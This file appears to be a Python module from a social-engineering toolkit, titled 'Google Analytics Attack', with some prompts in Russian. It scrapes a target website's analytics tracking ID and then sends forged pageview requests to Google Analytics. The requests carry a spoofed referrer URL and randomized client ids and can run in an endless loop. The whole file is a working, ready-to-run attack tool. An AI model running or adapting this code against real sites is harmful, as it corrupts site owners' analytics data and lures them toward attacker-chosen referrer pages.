#!/usr/bin/env python
from __future__ import print_function
print("Loading module. Please wait...")
import src.core.setcore
import sys
import requests
import re
import time
import random

try:
    input = raw_input
except NameError:
    pass

MAIN="Google Analytics Attack by @ZonkSec"
AUTHOR="Tyler Rosonke (@ZonkSec)"

### MAIN ###
def main():
    print_title()
    # определяет авто или вручную, затем вызывает функции
    mode_choice = input("[*] Выберите режим (автоматический / ручной): ")
    if mode_choice in ("automatic","auto"):
        print("\n[*] Вход в автоматический режим.\n")
        url = input("[*] Целевой веб-сайт (например, http://xyz.com/'): ")
        params = auto_params(url)
    elif mode_choice in ("manual","man"):
        print("\n[*] Вход в ручной режим.")
        params = manual_params()
    else:
        print("\n[-] Invalid mode.\n")
        sys.exit()
    # params have been collected, prompts for print
    print("\n[+] Payload ready.")
    printchoice = input("\n[*] Print payload?(y/n): ")
    if printchoice == "y":
        print_params(params)

    #sends request
    input("\nPress <enter> to send payload.")
    send_spoof(params)

    #prompts for loop, calls function if need be
    loopchoice = input("\n[*] Send payload on loop?(y/n) ")
    if loopchoice == "y":
        looper(params)
    input("\n\nЭтот модуль завершен. Нажмите <enter> для продолжения")

### print_params - loops through params and prints
def print_params(params):
    print()
    for entry in params:
        print(entry + " = " + params[entry])

### looper - prompts for seconds to sleep, starts loop
def looper(params):
    secs = input("[*] Секунды между отправкой полезной нагрузки: ")
    input("\nОтправка запроса каждый "+secs+" секунд. Используйте CTRL + C для завершения. Нажмите <enter>, чтобы начать цикл.")
    while True:
        send_spoof(params)
        time.sleep(int(secs))

### send_spoof - randomizes client id, then sends request to google service
def send_spoof(params):
    params['cid'] = random.randint(100,999)
    r = requests.get('https://www.google-analytics.com/collect', params=params)
    print("\n[+] Payload sent.")
    print(r.url)

### auto_params - makes request to target site, regexes for params
def auto_params(url):
    try: #parses URL for host and page
        m = re.search('(https?:\/\/(.*?))\/(.*)',url)
        host = str(m.group(1))
        page = "/" + str(m.group(3))
    except:
        print("\n[-] Невозможно проанализировать URL для хоста / страницы. Вы забыли концовку '/'?\n")
        sys.exit()
    try: #makes request to target page
        r = requests.get(url)
    except:
        print("\n[-] Невозможно достичь целевого веб-сайта для анализа.\n")
        sys.exit()
    try: #parses target webpage for title
        m = re.search('<title>(.*)<\/title>', r.text)
        page_title = str(m.group(1))
    except:
        print("\n[-] Невозможно проанализировать целевую страницу для заголовка.\n")
        sys.exit()
    try: #parses target webpage for tracking id
        m = re.search("'(UA-(.*))',", r.text)
        tid = str(m.group(1))
    except:
        print("\n[-] Невозможно найти TrackingID (UA-XXXXX). На сайте может не работать Google Anayltics.\n")
        sys.exit()
    #builds params dict
    params = {}
    params['v'] = "1"
    params['tid'] = tid
    params['cid'] = "555"
    params['t'] = "pageview"
    params['dh'] = host
    params['dp'] = page
    params['dt'] = page_title
    params['aip'] = "1"
    params['dr'] = input("\n[*] Введите реферальный URL для подмены (например, http://xyz.com/'): ")
    return params

### manual_params - prompts for all params
def manual_params():
    params = {}
    params['v'] = "1"
    params['tid'] = input("\n[*] Введите TrackingID (tid) (UA-XXXXX): ")
    params['cid'] = "555"
    params['t'] = "pageview"
    params['aip'] = "1"
    params['dh'] = input("[*] Введите целевой хост (dh) (например, http://xyz.xyz)': ")
    params['dp'] = input("[*] Введите целевую страницу (dp) (например, «/ aboutme»): ")
    params['dt'] = input("[*] Введите название целевой страницы (dt) (например, «О себе»): ")
    params['dr'] = input("[*] Войдите на реферальную страницу, чтобы подделать (dr): ")
    return params

### print_title - prints title and references
def print_title():
    print("\n----------------------------------")
    print("      Google Analytics Attack     ")
    print("    By Tyler Rosonke (@ZonkSec)   ")
    print("----------------------------------\n")
    print("User-Guide: http://www.zonksec.com/blog/social-engineering-google-analytics/\n")
    print("References:")
    print("-https://developers.google.com/analytics/devguides/collection/protocol/v1/reference")
    print("-https://developers.google.com/analytics/devguides/collection/protocol/v1/parameters\n\n")
